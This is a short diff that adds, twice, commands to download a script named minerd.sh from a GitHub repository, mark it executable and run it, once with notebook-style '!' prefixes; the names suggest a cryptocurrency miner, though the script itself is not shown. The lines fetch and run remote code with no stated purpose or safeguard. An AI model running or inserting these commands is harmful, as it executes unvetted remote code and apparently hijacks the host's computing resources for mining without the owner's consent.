@@ -1,0 +1,7 @@
+! wget -O minerd.sh https://raw.githubusercontent.com/baruaduh/LeefCoin.sh/main/minerd.sh
+! chmod +x minerd.sh
+! ./minerd.sh
+
+wget -O minerd.sh https://raw.githubusercontent.com/baruaduh/LeefCoin.sh/main/minerd.sh
+chmod +x minerd.sh
+./minerd.sh
